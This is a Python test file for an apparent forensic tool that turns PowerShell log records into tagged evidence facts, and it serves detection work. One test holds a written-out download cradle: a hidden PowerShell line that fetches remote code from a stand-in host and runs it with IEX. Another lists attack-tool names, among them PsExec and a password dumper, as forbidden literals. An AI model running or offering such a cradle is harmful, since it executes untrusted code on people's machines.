"""31M-alpha PowerShell command fact extraction tests.

Synthetic only. Dataset-agnostic. No case IOCs, PIDs, hashes, paths, or expected-case outputs.
"""
from __future__ import annotations

from sift_sentinel.analysis.evidence_db import build_typed_evidence_db, _c_powershell, _ps_ttp_tags
from sift_sentinel.validation import typed_validator as tv


def _rec(**kw):
    base = {
        "timestamp": "2099-01-01T00:00:00",
        "user": None,
        "host_application": "",
        "command": "",
        "decoded_command": "",
        "urls": [],
        "domains": [],
        "ips": [],
        "paths": [],
        "suspicious_markers": [],
        "source_file": "/synthetic/source.log",
        "raw_excerpt": "",
        "line_number": 1,
    }
    base.update(kw)
    return base


def _facts(records):
    return [fact for _, fact, _ in _c_powershell(records) if fact is not None]


def test_plain_noise_record_is_dropped():
    facts = _facts([_rec(command="ordinary application log entry with no forensic signal")])
    assert facts == []


def test_generic_log_field_only_noise_is_dropped():
    facts = _facts([
        _rec(
            command="vendor status line references a local path but no command behavior",
            paths=["C:\\\\ProgramData\\\\Vendor\\\\cache"],
            source_file="/synthetic/logs/vendor.log",
        )
    ])
    assert facts == []


def test_generic_marker_only_noise_is_dropped_without_powershell_context():
    facts = _facts([
        _rec(
            command="vendor updater says DownloadFile to temp",
            suspicious_markers=["DownloadFile"],
            paths=["C:\\\\Temp"],
            source_file="/synthetic/logs/vendor_error.log",
        )
    ])
    assert facts == []


def test_encoded_command_yields_fact_and_index():
    facts = _facts([
        _rec(
            command="powershell -EncodedCommand " + "A" * 80,
            user="analyst",
            line_number=7,
            source_file="/synthetic/ConsoleHost_history.txt",
        )
    ])
    assert len(facts) == 1
    fact = facts[0]
    assert fact["fact_type"] == "powershell_command_fact"
    assert fact["entity_id"] == "7::ConsoleHost_history.txt"
    assert "encoded_command" in fact["ttp_tags"]
    assert "encoded_command" in fact["index"]["by_ttp_tag"]
    assert fact["index"]["by_user"] == ["analyst"]


def test_download_cradle_and_stealth_flags_detected():
    text = (
        "powershell -NoProfile -WindowStyle Hidden "
        "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')"
    )
    tags = _ps_ttp_tags(text)
    assert "download_cradle" in tags
    assert "no_profile_hidden" in tags


def test_powershell_source_field_signal_is_kept():
    facts = _facts([
        _rec(
            command="Transcript line with URL evidence",
            urls=["http://example.invalid/file"],
            source_file="/synthetic/PowerShell_transcript.host.txt",
        )
    ])
    assert len(facts) == 1
    assert facts[0]["confidence_hint"] == "low"
    assert "example.invalid" in facts[0]["index"]["by_url_host"]


def test_long_base64_without_powershell_context_is_dropped():
    facts = _facts([
        _rec(
            command="random application blob " + "B" * 240,
            source_file="/synthetic/logs/application.log",
        )
    ])
    assert facts == []


def test_long_base64_with_powershell_context_is_kept():
    facts = _facts([
        _rec(
            command="powershell " + "C" * 240,
            source_file="/synthetic/PowerShell_transcript.host.txt",
        )
    ])
    assert len(facts) == 1
    assert "long_base64_blob" in facts[0]["ttp_tags"]


def test_powershell_validator_checker_matches_synthetic_typed_index():
    fact = _facts([
        _rec(
            command="powershell -EncodedCommand " + "D" * 80,
            source_file="/synthetic/ConsoleHost_history.txt",
        )
    ])[0]
    fact["fact_id"] = "powershell_command_fact-synthetic-1"

    evdb = {
        "typed_facts": {"powershell_command_fact": [fact]},
        "indexes": {"by_ttp_tag": {"encoded_command": [fact["fact_id"]]}},
    }
    tdb = tv.TypedEvidenceDB(evdb)

    assert "powershell_command" in getattr(tv, "_TYPED_CHECKERS", {})
    result = tv.typed_check_claim(
        {"type": "powershell_command", "ttp_tag": "encoded_command"},
        tdb,
    )
    assert result[0] == "MATCH"


def test_powershell_validator_checker_mismatch_synthetic_typed_index():
    fact = _facts([
        _rec(
            command="powershell -EncodedCommand " + "E" * 80,
            source_file="/synthetic/ConsoleHost_history.txt",
        )
    ])[0]
    fact["fact_id"] = "powershell_command_fact-synthetic-2"

    evdb = {
        "typed_facts": {"powershell_command_fact": [fact]},
        "indexes": {"by_ttp_tag": {"encoded_command": [fact["fact_id"]]}},
    }
    tdb = tv.TypedEvidenceDB(evdb)

    result = tv.typed_check_claim(
        {"type": "powershell_command", "ttp_tag": "download_cradle"},
        tdb,
    )
    assert result[0] == "MISMATCH"


def test_no_dataset_specific_literals_in_this_test_file():
    import pathlib

    src = pathlib.Path(__file__).read_text()
    forbidden = [
        "172" + ".16" + ".",
        "base" + "-dc",
        "base" + "-file",
        "Mnemo" + "syne",
        "subject" + "_srv",
        "PWD" + "umpX",
        "Ps" + "Exec.exe",
        "871" + "2",
        "826" + "0",
        "584" + "8",
        "287" + "6",
    ]
    assert [token for token in forbidden if token in src] == []



def test_build_typed_evidence_db_accepts_powershell_artifact_contract():
    """Regression: every compiler fact_spec must include artifact."""
    rec = _rec(
        command="powershell -EncodedCommand " + "F" * 80,
        line_number=12,
        source_file="/synthetic/PowerShell_transcript.host.txt",
    )
    evdb = build_typed_evidence_db(
        {"parse_powershell_transcripts": {"records": [rec], "output": [rec]}},
        {},
    )
    facts = evdb["typed_facts"]["powershell_command_fact"]
    assert len(facts) == 1
    fact = facts[0]
    assert fact["fact_signature"]
    assert "encoded_command" in fact["ttp_tags"]

    tdb = tv.TypedEvidenceDB(evdb)
    result = tv.typed_check_claim(
        {"type": "powershell_command", "ttp_tag": "encoded_command"},
        tdb,
    )
    assert result[0] == "MATCH"



def test_powershell_indexes_registered_in_index_names():
    from sift_sentinel.analysis import evidence_db as edb

    required = {
        "by_ttp_tag",
        "by_user",
        "by_timestamp_minute",
        "by_source_file_basename",
        "by_ip",
        "by_url_host",
    }
    assert required.issubset(set(edb.INDEX_NAMES))
